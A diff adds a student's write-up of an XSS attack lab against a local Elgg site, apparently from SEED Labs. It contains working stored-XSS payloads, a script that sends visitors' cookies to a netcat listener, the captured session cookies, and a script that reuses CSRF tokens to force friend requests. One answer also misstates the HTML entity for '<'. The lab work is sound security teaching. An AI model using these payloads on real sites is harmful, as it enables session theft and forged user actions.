@@ -75,3 +75,82 @@ flag{5155603df944885d37463ad476a1accd}
 
 ---
 
+## Cross-Site Scripting (XSS) Attack Lab
+
+### Task 1
+
+For this task we just needed to log in as any one of the users in the database (with the credentials given) and edit the user's description to have the following text:
+
+```html
+<script>alert('XSS');</script>
+```
+
+This will trigger an alert message when any user enters that profile.
+
+### Task 2
+
+With the following description, whenever a user joins that profile, their cookies will be displayed in an alert window:
+
+```html
+<script>alert(document.cookie);</script>
+```
+
+Cookies example:
+```
+pvisitor=a02dec0a-c90f-4a12-acaa-ca277c1f8a1d; PHPSESSID=j5u1i90e7ve1umqhfil26rsuk6; Elgg=1sof8kijmob8riqak3r8qaku3e
+```
+
+### Task 3
+
+For this task we will use the following description:
+
+```html
+<script>
+    document.write('<img src=http://10.9.0.1:5555?c='+ escape(document.cookie) + ' >');
+</script>
+```
+
+Using the `nc -lknv 5555` command, we can listen to the TCP port 5555, and get the cookies of the other users:
+```
+Connection received on 10.0.2.4 34434
+GET /?c=pvisitor%3Da02dec0a-c90f-4a12-acaa-ca277c1f8a1d%3B%20PHPSESSID%3Dj5u1i90e7ve1umqhfil26rsuk6%3B%20Elgg%3D0gdcs8aalkh93malsee9c88pld HTTP/1.1
+Host: 10.9.0.1:5555
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://www.seed-server.com/profile/alice
+```
+
+### Task 4
+
+In order to make any user send a friend request whenever accessing `samy`'s profile, we need to change his `About Me` to the following:
+
+```html
+<script type="text/javascript">
+    window.onload = function () {
+        var Ajax = null;
+        var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
+        var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
+
+        //Construct the HTTP request to add Samy as a friend.
+        var sendurl="http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
+
+        //Create and send Ajax request to add friend
+        Ajax=new XMLHttpRequest();
+        Ajax.open("GET", sendurl, true);
+        Ajax.send();
+    }
+</script>
+```
+
+With this script, any user that joins the profile automatically sends a friend request.
+
+#### Question 1
+
+Lines 1 and 2 are used to authenticate the user whenever the request is made to the url. Each user has security tokens that are used in order to prevent other users from making requests in their name. This ensures that the requests are actually being sent by the user. Without them, the request would fail.
+
+#### Question 2
+
+No, if the Elgg application only provided the Editor mode for the “About me” field, the attack would not be successful because the Editor mode adds extra HTML and changes some of the symbols, such as `<` to `&gt;`.
